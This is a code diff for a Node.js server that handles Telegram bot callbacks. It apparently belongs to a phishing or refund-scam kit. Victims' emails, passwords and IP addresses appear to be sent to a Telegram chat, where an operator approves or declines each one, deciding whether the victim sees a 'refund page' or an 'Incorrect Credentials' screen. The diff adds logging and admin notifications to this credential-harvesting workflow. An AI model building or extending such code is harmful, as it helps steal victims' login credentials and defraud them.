@@ -89,9 +89,13 @@ async function sendTelegramMessageWithButtons(email, password, firstName, ip, us
 // ============================================
 app.post('/api/telegram-callback', async (req, res) => {
     try {
+        console.log('📨 Callback received from Telegram!');
+        console.log('📨 Request body:', JSON.stringify(req.body, null, 2));
+
         const { callback_query } = req.body;
         
         if (!callback_query) {
+            console.log('⚠️ No callback_query found');
             return res.status(400).send('OK');
         }
 
@@ -99,12 +103,15 @@ app.post('/api/telegram-callback', async (req, res) => {
         const chatId = callback_query.message.chat.id;
         const messageId = callback_query.message.message_id;
 
-        console.log('📨 Callback received:', data);
+        console.log('📨 Callback data:', data);
 
+        // Parse the callback data
         const parts = data.split('_');
-        const action = parts[0];
+        const action = parts[0]; // 'approve' or 'decline'
         const email = parts.slice(1, -1).join('_');
         const firstName = parts[parts.length - 1];
+
+        console.log(`📝 Action: ${action}, Email: ${email}, Name: ${firstName}`);
 
         // ✅ STORE THE USER STATUS
         userStatuses[email] = action === 'approve' ? 'approved' : 'declined';
@@ -134,6 +141,7 @@ app.post('/api/telegram-callback', async (req, res) => {
             `;
         }
 
+        // Edit the original message to show the result
         const editUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
         await axios.post(editUrl, {
             chat_id: chatId,
@@ -142,10 +150,25 @@ app.post('/api/telegram-callback', async (req, res) => {
             parse_mode: 'HTML'
         });
 
+        console.log('✅ Message updated in Telegram');
+
+        // Send a confirmation to the admin
+        const notifyUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(notifyUrl, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: action === 'approve' 
+                ? `✅ User ${email} has been approved! They will see the refund page.`
+                : `❌ User ${email} has been declined! They will see "Incorrect Credentials".`,
+            parse_mode: 'HTML'
+        });
+
+        console.log('✅ Confirmation sent to admin');
+
         res.send('OK');
 
     } catch (error) {
-        console.error('Callback error:', error.message);
+        console.error('❌ Callback error:', error.message);
+        console.error('❌ Error details:', error.response?.data || error);
         res.send('OK');
     }
 });
